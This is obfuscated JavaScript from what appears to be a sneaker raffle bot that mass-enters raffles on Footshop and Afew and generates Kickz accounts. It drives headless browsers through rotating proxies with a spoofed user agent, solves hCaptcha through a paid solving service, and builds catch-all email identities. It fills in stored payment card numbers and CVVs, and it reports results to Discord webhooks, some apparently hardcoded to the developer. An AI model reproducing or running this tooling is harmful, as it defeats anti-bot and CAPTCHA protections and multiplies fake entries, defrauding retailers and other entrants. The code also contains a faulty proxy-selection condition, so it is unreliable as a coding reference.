    if (_0x152d8a['useRandomProxy'] = ![])
        var _0x3a5210 = _0x28b7b7[_0x4ad433]['split'](':');
    else
        var _0x2bb458 = Math['round'](Math['random']() * (_0x28b7b7['length'] - 0x1)), _0x3a5210 = _0x28b7b7[_0x2bb458]['split'](':');
    var _0x17b7ff = _0x235e52['data'];
    _0x2ee3b0 != 'ver' && (_0x17b7ff['data']['attributes']['properties']['$first_name'] = '' + _0x11d34a[_0x4ad433]['FirstName'], _0x17b7ff['data']['attributes']['properties']['$last_name'] = '' + _0x11d34a[_0x4ad433]['LastName'], _0x17b7ff['data']['attributes']['properties']['$address1'] = _0x11d34a[_0x4ad433]['Address1'] + '\x20' + _0x11d34a[_0x4ad433]['Address2'], _0x17b7ff['data']['attributes']['properties']['$zip'] = '' + _0x11d34a[_0x4ad433]['Zip'], _0x17b7ff['data']['attributes']['properties']['$city'] = '' + _0x11d34a[_0x4ad433]['City'], _0x17b7ff['data']['attributes']['properties']['$country'] = '' + _0x11d34a[_0x4ad433]['Country'], _0x17b7ff['data']['attributes']['properties']['Size'] = '' + _0x11d34a[_0x4ad433]['Size'], _0x17b7ff['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x11d34a[_0x4ad433]['Follower'], _0x2ee3b0 == 'exp' ? _0x17b7ff['data']['attributes']['email'] = '' + _0x11d34a[_0x4ad433]['FirstName'] + _0x11d34a[_0x4ad433]['LastName'] + _0x152d8a['catchall'] : _0x17b7ff['data']['attributes']['email'] = '' + _0x11d34a[_0x4ad433]['Email']);
    var _0xb96b97 = {
        'jar': _0x37e6cd,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x235e52['url'],
        'headers': _0x235e52['headers'],
        'body': JSON['stringify'](_0x17b7ff),
        'proxy': 'http://' + _0x3a5210[0x2] + ':' + _0x3a5210[0x3] + '@' + _0x3a5210[0x0] + ':' + _0x3a5210[0x1]
    };
    return _0x2ee3b0 === 'ver' && (_0xb96b97['method'] = 'GET'), new Promise(function (_0x1713a0, _0x2d2674) {
        callback = async (_0x578096, _0x4fd9ab, _0x481e84) => {
            !_0x578096 && _0x4fd9ab['statusCode'] == 0xca || !_0x578096 && _0x4fd9ab['statusCode'] == 0xc8 ? _0x1713a0(console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x235e52['name'] + ']\x20Task\x20' + (_0x4ad433 + 0x1) + ':\x20Raffle\x20Entered!'))) : (embed[0x0]['title'] = 'Failed\x20entry', embed[0x0]['description'] = '' + _0x578096, await _0x3acacc(_0x2c49ed, msg), _0x2d2674(console['log'](_0xfa2bb1() + '\x20[' + _0x235e52['name'] + ']\x20Task\x20' + (_0x4ad433 + 0x1) + ':\x20' + _0x578096)));
        };
        try {
            _0x2ee3b0 === 'ver' ? console['log'](_0xfa2bb1() + '\x20[' + _0x235e52['name'] + ']\x20Task\x20' + (_0x4ad433 + 0x1) + ':\x20Verifying.') : console['log'](_0xfa2bb1() + '\x20[' + _0x235e52['name'] + ']\x20Task\x20' + (_0x4ad433 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x17b7ff['data']['attributes']['email']), _0x994449(_0xb96b97, callback);
        } catch (_0x49e2d8) {
            console['log'](_0xfa2bb1() + '\x20Task\x20' + (_0x4ad433 + 0x1) + ':\x20' + _0x49e2d8);
        }
    });
}
;
async function _0x2200bb(_0x3e2dde, _0x3a8c4c, _0xaff4fa) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x9ab7d7 = 0x0; _0x9ab7d7 < _0x3e2dde['length']; _0x9ab7d7++) {
        var _0x1788fa, _0x153ffa = '', _0xe43330 = 0x0, _0x2df92e = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x550f31
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3e2dde[_0x9ab7d7]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3e2dde[_0x9ab7d7]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x112c11
                }
            ]
        }], _0xbd3ff2 = await _0x5a270a(_0x3e2dde[_0x9ab7d7], _0xaff4fa, 'dev', ![]), _0x12cf58 = await _0x5a270a(_0x3e2dde[_0x9ab7d7], _0xaff4fa, 'pub', ![]);
        const _0x1efbed = {
            'succesDEVMSG': { 'embeds': [_0xbd3ff2] },
            'succesPUBMSG': { 'embeds': [_0x12cf58] }
        }, _0x23fccb = { 'embeds': _0x2df92e };
        await _0x82271d(_0x3e2dde, _0x9ab7d7);
        if (_0x3e2dde[_0x9ab7d7]['Email'] == '' || _0x3e2dde[_0x9ab7d7]['FirstName'] == '' || _0x3e2dde[_0x9ab7d7]['LastName'] == '' || _0x3e2dde[_0x9ab7d7]['Country'] == '' || _0x3e2dde[_0x9ab7d7]['Size'] == '' || _0x3e2dde[_0x9ab7d7]['Address1'] == '' || _0x3e2dde[_0x9ab7d7]['Zip'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x3e2dde[_0x9ab7d7]['Email'] == '' || _0x3e2dde[_0x9ab7d7]['FirstName'] == '' || _0x3e2dde[_0x9ab7d7]['LastName'] == '' || _0x3e2dde[_0x9ab7d7]['Country'] == '' || _0x3e2dde[_0x9ab7d7]['Size'] == '' || _0x3e2dde[_0x9ab7d7]['Address1'] == '' || _0x3e2dde[_0x9ab7d7]['Zip'] == '' || _0x3e2dde[_0x9ab7d7]['Phone'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x3237c8 = '' + _0x3e2dde[_0x9ab7d7]['Url'];
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x7743fc = _0x3a8c4c[_0x9ab7d7]['split'](':');
        else
            var _0x8cd7bc = Math['round'](Math['random']() * (_0x3a8c4c['length'] - 0x1)), _0x7743fc = _0x3a8c4c[_0x8cd7bc]['split'](':');
        const _0x748a11 = await _0x10a68d['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x7743fc[0x0] + ':' + _0x7743fc[0x1]]
        });
        try {
            const _0x5c97f3 = await _0x748a11['newPage']();
            await _0x5c97f3['authenticate']({
                'username': '' + _0x7743fc[0x2],
                'password': '' + _0x7743fc[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c97f3['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5c97f3['setRequestInterception'](!![]), _0x5c97f3['on']('request', _0xe8fef6 => {
                _0xe8fef6['resourceType']() === 'image' || _0xe8fef6['resourceType']() === 'font' || _0xe8fef6['resourceType']() === 'media' ? _0xe8fef6['abort']() : _0xe8fef6['continue']();
            }), await _0x5c97f3['goto'](_0x3237c8), await _0xfe9813(0xbb8), await _0x5c97f3['waitForSelector']('.control__JhutY'), await _0x5c97f3['click']('.control__JhutY'), await _0xfe9813(0x1f4);
            if (_0x3e2dde[_0x9ab7d7]['Size'] != 'RANDOM')
                try {
                    const _0x1c3307 = await _0x5c97f3['$x']('//div[contains(text(),\x20\x27' + _0x3e2dde[_0x9ab7d7]['Size'] + '\x27)]');
                    await _0x1c3307[0x0]['click']();
                } catch {
                    console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x2d1449 = await _0x5c97f3['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x456dfa = Math['round'](Math['random']() * (_0x2d1449['length'] - 0x1));
                await _0x2d1449[_0x456dfa]['click']();
            }
            await _0xfe9813(0x4b0);
            const _0x155a5 = await _0x5c97f3['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x155a5[0x0]['click'](), await _0x5c97f3['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x5c97f3['type']('input[name=\x22email\x22]', '' + _0x3e2dde[_0x9ab7d7]['Email']), await _0xfe9813(0x640), await _0x5c97f3['type']('input[name=\x22phone\x22]', '' + _0x3e2dde[_0x9ab7d7]['Phone']), await _0xfe9813(0x4b0), await _0x5c97f3['click']('button.btn.continue-button__1RtsS'), await _0xfe9813(0x4b0);
            try {
                await _0x5c97f3['type']('input[name=\x22firstName\x22]', '' + _0x3e2dde[_0x9ab7d7]['FirstName']), await _0xfe9813(0x258);
            } catch {
                const _0x9cd229 = await _0x5c97f3['$$eval']('.invalid-feedback\x20>\x20div', _0x4d670c => {
                    return _0x4d670c['map'](_0x30f9cf => _0x30f9cf['innerText']);
                });
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20' + _0x9cd229));
                continue;
            }
            await _0x5c97f3['type']('input[name=\x22lastName\x22]', '' + _0x3e2dde[_0x9ab7d7]['LastName']), await _0xfe9813(0xc8), await _0x5c97f3['type']('input[name=\x22instagramUsername\x22]', '' + _0x3e2dde[_0x9ab7d7]['Follower']), await _0xfe9813(0x4b0), await _0x5c97f3['click']('button.btn.continue-button__1RtsS'), await _0xfe9813(0x3e8), console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x5c97f3['select']('select[name=\x22country\x22]', '' + _0x3e2dde[_0x9ab7d7]['Country']), await _0xfe9813(0x2bc), await _0x5c97f3['type']('input[name=\x22streetName\x22]', '' + _0x3e2dde[_0x9ab7d7]['Address1']), await _0xfe9813(0x258), await _0x5c97f3['type']('input[name=\x22houseNumber\x22]', _0x3e2dde[_0x9ab7d7]['HouseNumber'] + '\x20' + _0x3e2dde[_0x9ab7d7]['Address2']), await _0xfe9813(0xc8), await _0x5c97f3['type']('input[name=\x22postalCode\x22]', '' + _0x3e2dde[_0x9ab7d7]['Zip']), await _0xfe9813(0x1f4), await _0x5c97f3['type']('input[name=\x22city\x22]', '' + _0x3e2dde[_0x9ab7d7]['City']), await _0xfe9813(0x4b0), await _0x5c97f3['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xfe9813(0x4b0), await _0x5c97f3['click']('button.btn.continue-button__1RtsS'), await _0xfe9813(0x4b0), console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x5c97f3['solveRecaptchas'](), console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xfe9813(0xbb8), await _0x5c97f3['click']('button.btn.continue-button__1RtsS'), await _0xfe9813(0x1388), console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5c97f3['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5c97f3['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xfe9813(0x4b0), await _0x5c97f3['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x3e2dde[_0x9ab7d7]['CardNumber']), await _0xfe9813(0x320), await _0x5c97f3['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5c97f3['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x3e2dde[_0x9ab7d7]['ExpiryDate']), await _0xfe9813(0x4b0), await _0x5c97f3['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5c97f3['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x3e2dde[_0x9ab7d7]['CVV']), await _0xfe9813(0x226), await _0x5c97f3['type']('input[name=\x22holderName\x22]', '' + _0x3e2dde[_0x9ab7d7]['NameOnCard']), await _0xfe9813(0x226), await _0x5c97f3['click']('button.adyen-checkout__button'), console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x5c97f3['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xfe9813(0xbb8);
            } catch (_0x5baeb6) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x203DS\x20Failed')), _0x1788fa = '3DS\x20Error\x20' + _0x5baeb6;
                var _0x1e8109 = await _0x5a270a(_0x3e2dde[_0x9ab7d7], _0xaff4fa, 'dev', !![], _0x1788fa);
                _0x1efbed['errorDEV'] = { 'embeds': [_0x1e8109] };
                _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x1efbed['errorDEV']);
                await _0x3acacc(_0x2c49ed, _0x1efbed['errorDEV']);
                continue;
            }
            console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '')
                try {
                    await _0x3acacc(_0x152d8a['webhook'], _0x1efbed['succesDEVMSG']);
                } catch {
                }
            await _0xfe9813(0xc8), await _0x3acacc(_0xe7a394, _0x1efbed['succesDEVMSG']), await _0xfe9813(0xc8);
            try {
                await _0x3acacc(_0x1c5083, _0x1efbed['succesPUBMSG']);
            } catch {
            }
        } catch (_0x44c4c3) {
            console['log'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20' + _0x44c4c3), _0x1788fa = '' + _0x44c4c3;
            var _0x1e8109 = await _0x5a270a(_0x3e2dde[_0x9ab7d7], _0xaff4fa, 'dev', !![], _0x1788fa);
            _0x1efbed['errorDEV'] = { 'embeds': [_0x1e8109] }, _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x1efbed['errorDEV']), await _0x3acacc(_0x2c49ed, _0x1efbed['errorDEV']), _0x153ffa = 'yes';
        } finally {
            _0x748a11['close']();
            if (_0x153ffa == 'yes' && _0xe43330 != 0x5) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0xaff4fa['name'] + ']\x20Task\x20' + (_0x9ab7d7 + 0x1) + '\x20:\x20Retrying')), _0x9ab7d7 = _0x9ab7d7 - 0x1, _0xe43330 = _0xe43330 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x152d8a['footshopDelay'] + '\x20ms'), await _0xfe9813(_0x152d8a['footshopDelay']);
        }
    }
}
afewFunction = async (_0x57a503, _0x57af54, _0x1e1974, _0x3297f2, _0x179770) => {
    for (var _0x2c3787 = 0x0; _0x2c3787 < _0x3297f2['length']; _0x2c3787++) {
        _0x152d8a['AfewDelay'] = _0x152d8a['delay'];
        var _0xc8e8c7, _0x4020d8 = '', _0x56a61b = 0x0;
        _0x3297f2[_0x2c3787]['Url'] = _0x57a503, _0x193d7e(_0x1e1974['name'] + '\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20/\x20' + _0x3297f2['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7), await _0x82271d(_0x3297f2, _0x2c3787);
        var _0x44d581 = await _0x5a270a(_0x3297f2[_0x2c3787], _0x1e1974, 'dev', ![]), _0x25b32f = await _0x5a270a(_0x3297f2[_0x2c3787], _0x1e1974, 'pub', ![]);
        const _0x503e7d = {
            'succesDEVMSG': { 'embeds': [_0x44d581] },
            'succesPUBMSG': { 'embeds': [_0x25b32f] }
        };
        if (_0x3297f2[_0x2c3787]['Email'] == '' || _0x3297f2[_0x2c3787]['FirstName'] == '' || _0x3297f2[_0x2c3787]['LastName'] == '' || _0x3297f2[_0x2c3787]['Country'] == '' || _0x3297f2[_0x2c3787]['Size'] == '' || _0x3297f2[_0x2c3787]['Address1'] == '' || _0x3297f2[_0x2c3787]['Zip'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x37460c = _0x179770[_0x2c3787]['split'](':');
        else
            var _0x3db8b2 = Math['round'](Math['random']() * (_0x179770['length'] - 0x1)), _0x37460c = _0x179770[_0x3db8b2]['split'](':');
        const _0x3bf6f8 = await _0x10a68d['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x37460c[0x0] + ':' + _0x37460c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1a8eee = await _0x3bf6f8['newPage']();
            await _0x1a8eee['setDefaultNavigationTimeout'](0x1d4c0), await _0x1a8eee['authenticate']({
                'username': '' + _0x37460c[0x2],
                'password': '' + _0x37460c[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1a8eee['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1a8eee['setRequestInterception'](!![]), _0x1a8eee['on']('request', _0x389341 => {
                _0x389341['resourceType']() === 'image' || _0x389341['resourceType']() === 'font' || _0x389341['resourceType']() === 'media' ? _0x389341['abort']() : _0x389341['continue']();
            }), await _0x1a8eee['goto'](_0x57a503, { 'waitUntil': 'networkidle2' }), console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x1a8eee['waitForTimeout'](0xfa0), console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x1a8eee['waitForTimeout'](0x320);
            if (_0x3297f2[_0x2c3787]['Size'] == 'RANDOM') {
                console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x526941 = await _0x1a8eee['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x166b91 => {
                    return _0x166b91['map'](_0x76f8cd => _0x76f8cd['href']);
                });
                var _0x5edffa = Math['round'](Math['random']() * (_0x526941['length'] - 0x1));
                await _0x1a8eee['goto']('' + _0x526941[_0x5edffa]);
            } else {
                console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3297f2[_0x2c3787]['Size']);
                try {
                    const _0x212680 = await _0x1a8eee['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x3297f2[_0x2c3787]['Size'] + '\x22]\x20>\x20a', _0x10cff3 => {
                        return _0x10cff3['map'](_0x359e57 => _0x359e57['href']);
                    });
                    await _0x1a8eee['goto']('' + _0x212680[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x43ae71) {
                    console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20' + _0x43ae71 + '\x20Size\x20not\x20found')), _0xc8e8c7 = 'Size\x20Not\x20Found';
                    var _0x3a1cac = await _0x5a270a(_0x3297f2[_0x2c3787], _0x1e1974, 'dev', !![], _0xc8e8c7);
                    _0x503e7d['errorDEV'] = { 'embeds': [_0x3a1cac] };
                    _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x503e7d['errorDEV']);
                    await _0x3acacc(_0x2c49ed, _0x503e7d['errorDEV']);
                    continue;
                }
            }
            await _0x1a8eee['waitForTimeout'](0x258), await _0x1a8eee['type']('#raffle-instagram', '' + _0x3297f2[_0x2c3787]['Follower'], { 'delay': 0x64 }), await _0x1a8eee['waitForTimeout'](0x384), await _0x1a8eee['click']('#raffle-terms'), await _0x1a8eee['waitForTimeout'](0x384), await _0x1a8eee['evaluate'](() => {
                const _0x5a2a9c = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x5a2a9c['click']();
            }), await _0x1a8eee['waitForTimeout'](0xbb8), await _0x1a8eee['waitForSelector']('#checkout_email'), await _0xfe9813(0x3e8), console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Filling\x20Information');
            _0x57af54 == 'sec' ? await _0x1a8eee['type']('#checkout_email', '' + _0x3297f2[_0x2c3787]['FirstName'] + _0x3297f2[_0x2c3787]['LastName'] + _0x152d8a['catchall'], 0x32) : await _0x1a8eee['type']('#checkout_email', '' + _0x3297f2[_0x2c3787]['Email'], 0x32);
            await _0xfe9813(0x320), await _0x1a8eee['select']('#checkout_shipping_address_country', '' + _0x3297f2[_0x2c3787]['Country']), await _0x1a8eee['waitForTimeout'](0x258), await _0x1a8eee['type']('#checkout_shipping_address_first_name', '' + _0x3297f2[_0x2c3787]['FirstName']), await _0x1a8eee['waitForTimeout'](0x320), await _0x1a8eee['type']('#checkout_shipping_address_last_name', '' + _0x3297f2[_0x2c3787]['LastName']), await _0x1a8eee['waitForTimeout'](0x2bc), await _0x1a8eee['type']('#checkout_shipping_address_address1', _0x3297f2[_0x2c3787]['Address1'] + '\x20' + _0x3297f2[_0x2c3787]['HouseNumber']), await _0x1a8eee['waitForTimeout'](0x2bc), await _0x1a8eee['type']('#checkout_shipping_address_address2', '' + _0x3297f2[_0x2c3787]['Address2']), await _0x1a8eee['waitForTimeout'](0x2bc);
            _0x3297f2[_0x2c3787]['Postcode'] == undefined ? await _0x1a8eee['type']('#checkout_shipping_address_zip', '' + _0x3297f2[_0x2c3787]['Zip']) : await _0x1a8eee['type']('#checkout_shipping_address_zip', '' + _0x3297f2[_0x2c3787]['Postcode']);
            await _0x1a8eee['waitForTimeout'](0x2bc), await _0x1a8eee['type']('#checkout_shipping_address_city', '' + _0x3297f2[_0x2c3787]['City']), await _0x1a8eee['waitForTimeout'](0x2bc), console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x1a8eee, _0x1a8eee['evaluate'](() => {
                const _0x5d2a98 = document['querySelector']('#continue_button');
                for (var _0x518192 = 0x0; _0x518192 < 0x5; _0x518192++) {
                    if (_0x5d2a98) {
                        _0x5d2a98['click'](), _0x5d2a98['click']();
                        break;
                    } else
                        _0xfe9813(0xfa0);
                }
            }), await _0x1a8eee['waitForTimeout'](0x1194);
            try {
                await _0x1a8eee['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x1a8eee['evaluate'](() => {
                const _0x45d994 = document['querySelector']('#continue_button');
                for (var _0x13bde8 = 0x0; _0x13bde8 < 0x5; _0x13bde8++) {
                    if (_0x45d994) {
                        _0x45d994['click']();
                        break;
                    } else
                        _0xfe9813(0xfa0);
                }
            }), await _0x1a8eee['waitForTimeout'](0x7d0), console['log'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1a8eee['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x1a8eee['evaluate'](() => {
                const _0x154d6e = document['querySelector']('#continue_button');
                for (var _0x1965b8 = 0x0; _0x1965b8 < 0x5; _0x1965b8++) {
                    if (_0x154d6e) {
                        _0x154d6e['click']();
                        break;
                    } else
                        _0xfe9813(0xfa0);
                }
            }), await _0x1a8eee['waitForTimeout'](0x1194), await _0x1a8eee['waitForSelector']('#continue_button'), _0x1a8eee['evaluate'](() => {
                const _0x26c179 = document['querySelector']('#continue_button');
                for (var _0x10becb = 0x0; _0x10becb < 0x5; _0x10becb++) {
                    if (_0x26c179) {
                        _0x26c179['click']();
                        break;
                    } else
                        _0xfe9813(0xfa0);
                }
            });
            try {
                await _0x1a8eee['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '')
                    try {
                        await _0x3acacc(_0x152d8a['webhook'], _0x503e7d['succesDEVMSG']);
                    } catch {
                    }
                await _0xfe9813(0xc8), await _0x3acacc(_0xe7a394, _0x503e7d['succesDEVMSG']), await _0xfe9813(0xc8);
                try {
                    await _0x3acacc(_0x1c5083, _0x503e7d['succesPUBMSG']);
                } catch {
                }
            } catch (_0x4f732a) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x4f732a));
            }
        } catch (_0x415978) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20' + _0x415978)), _0xc8e8c7 = '' + _0x415978;
            var _0x3a1cac = await _0x5a270a(_0x3297f2[_0x2c3787], _0x1e1974, 'dev', !![], _0xc8e8c7);
            _0x503e7d['errorDEV'] = { 'embeds': [_0x3a1cac] }, _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x503e7d['errorDEV']), await _0x3acacc(_0x2c49ed, _0x503e7d['errorDEV']), _0x4020d8 = 'yes';
        } finally {
            _0x3bf6f8 && _0x3bf6f8['close']();
            if (_0x4020d8 == 'yes' && _0x56a61b != 0x5 && _0xc8e8c7 != 'Size\x20Not\x20Found') {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x1e1974['name'] + ']\x20Task\x20' + (_0x2c3787 + 0x1) + '\x20:\x20Retrying')), _0x2c3787 = _0x2c3787 - 0x1, _0x56a61b = _0x56a61b + 0x1;
                continue;
            }
            if (_0x2c3787 + 0x1 == _0x3297f2['length']) {
                console['log'](_0x298364['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0xfe9813(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x152d8a['AfewDelay'] + '\x20ms'), await _0xfe9813(_0x152d8a['AfewDelay']);
        }
    }
};
async function _0x23039d(_0x507e84, _0x1a65a3, _0x4e1102, _0x45acad) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x57b9a9 = 0x0; _0x57b9a9 < _0x4e1102['length']; _0x57b9a9++) {
        var _0x439de9 = '', _0x114eb7 = 0x0;
        _0x193d7e(_0x1a65a3['name'] + '\x20Task\x20' + (_0x57b9a9 + 0x1) + '\x20/\x20' + _0x4e1102['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7), await _0x82271d(_0x4e1102, _0x57b9a9);
        var _0x2463bd = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x550f31
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x112c11
                }
            ]
        }];
        const _0x54d514 = { 'embeds': _0x2463bd };
        var _0xa5c42b = await _0x5a270a(_0x4e1102[_0x57b9a9], _0x1a65a3, 'acc', ![]);
        const _0x3f3a95 = { 'succesDEVMSG': { 'embeds': [_0xa5c42b] } };
        if (_0x4e1102[_0x57b9a9]['Email'] == '' || _0x4e1102[_0x57b9a9]['FirstName'] == '' || _0x4e1102[_0x57b9a9]['LastName'] == '') {
